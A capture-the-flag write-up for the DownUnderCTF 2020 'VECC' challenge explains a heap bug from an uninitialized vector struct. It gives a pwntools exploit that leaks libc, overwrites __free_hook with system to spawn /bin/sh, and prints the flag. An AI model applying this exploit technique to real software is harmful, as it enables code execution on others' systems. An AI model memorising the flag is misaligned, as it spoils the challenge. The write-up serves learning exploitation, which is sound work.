# DownUnderCTF 2020 - VECC
### Description
*I've been porting C++ vectors to C and I think I've finally hit a flawless implementation! I even made a cool shell for playing with them and everything!*

### Analysis
The program implements its own vector structure and gives us a shell to use all of its functions. This is how the struct looks like after reversing it with IDA:

```c
struct vec{
  char* buffer; //64 bit
  int size; //32 bit
  int capacity; //32 bit
}; //total size: 0x10 bytes

```

`capacity` is the total length of the buffer, while `size` is what we're actually using. The struct comes with a set of functions such as `append`, `clear`, `destroy`. When we want to go over the vector's capacity, `realloc` is called on `buffer` with the next power of 2. Very standard implementation.


### The Vulnerability
```c
int create_vecc(){
  int v0; // eax

  v0 = get_index();
  if ( v0 == -1 )
    return puts("Invalid!");
  *(&vectors + v0) = (vec *)malloc(0x10uLL);
  return puts("Done!");
}
```

Do not look for what's there, look for what's *not* there. None of the struct's members are initialized. How can this be exploited?

`vec` structs are obtained with malloc(0x10), the 0x20 bin. malloc recycles chunks that were already freed.

We can "initialize" the `vec` struct ourselves with the values we place in a chunk we free. Let's see what happens when we destroy a vector.

```c
int destroy_vecc(){
  // ~ snip ~
  v3 = *(&vectors + v0);
  if ( v2->buffer ) {
    free((void *)v2->buffer);
    v3 = *(&vectors + v1);
  }
  v2->buffer = 0LL;
  *(_QWORD *)&v2->size = 0LL; //this also clears capacity! Notice the QWORD cast.
  free(v3);
  *(&vectors + v1) = 0LL;
  puts("Done!");
}
```

The vector's buffer is freed and its size & capacity are set to 0. Note that even though the buffer was freed, it still lives in the heap. We just lose the first 8 bytes of it because they will be used by the tcache, as linked list pointer.

We can use this to set the `capacity` of a `vec` to whatever value we want, allowing us to perform an overflow on the heap. But we don't even need to do a real overflow. `buffer`, uninitialized, will point to the next free chunk in the 0x20 bin. If `capacity` were set to 0 the program would call realloc, giving us a new in-use chunk. With the overwritten `capacity` we can write on this free chunk no problem! This is a bit like having a surprise UAF.


### The Exploit
After figuring out the vulnerability it's really just a matter of sitting down with gdb and trying things until you're doing something that works. This is what I ended up with.

```python
# Create a vector and a 0x10 buffer
create_vecc(0)
append(0, 0x10, b'a'*8 + p32(0) + p32(0x102020))

# Free the buffer and then the vector struct.
destroy_vecc(0)

# Takes vector0's chunk. This is not useful.
create_vecc(1)

# Takes buffer0's chunk. This is useful.
# vector2 will have 0x102020 capacity, because it takes the freed buffer chunk from vec 0.
# Also, the buffer member points to the next free 0x20 bin chunk.
create_vecc(2)

# This means we can take control of the tcache, or of the content of the next 0x20 chunk we allocate. 
# In this case, taking control of the tcache is just a side effect.
# What I'm really trying to do is defining the next vec struct.
# buffer = 0x602030
# size = 8
# capacity = [big number]
# Remember that append_vecc uses malloc to store the input.
# Do not use the 0x20 bin for it! That would defeat the point. Here I am using the 0x30 bin
append(2, 0x20, p64(0x602030) + p32(8) + b'a'*0x14)

# vec3 struct is initialized just like we wanted it.
# 0x602030 is on the .bss segment, just before the list of vec structs at 0x602040.
# 0x602030 contains a pointer to the libc's stdin struct, which means we can leak libc.
create_vecc(3)
show_vecc(3)
leak = u64(p.recv(8))
libc_elf.address = leak - libc_elf.sym['_IO_2_1_stdin_']
log.info(f'Libc: {hex(libc_elf.address)}')

# extend vec3 and make a fake vector on 0x602038, pointing to __free_hook - 8.
# Add the fake vec to the list of vectors, index 1
append(3, 0x40, p64(libc_elf.sym['__free_hook'] - 8) + p32(0) + p32(0x10000) + p64(0x602038) + b'a'*0x28)

# Overwrite free_hook. This input string will be placed in a temporary buffer, so we send /bin/sh\x00 first,
# And when free is called on the temporary buffer it will be taken as parameter to system.
append(1, 0x20, b'/bin/sh\x00' + p64(libc_elf.sym['system']) + b'a'*0x10)
```

### The Flag
DUCTF{h@v_2_z3r0_ur_all0ca710n5}
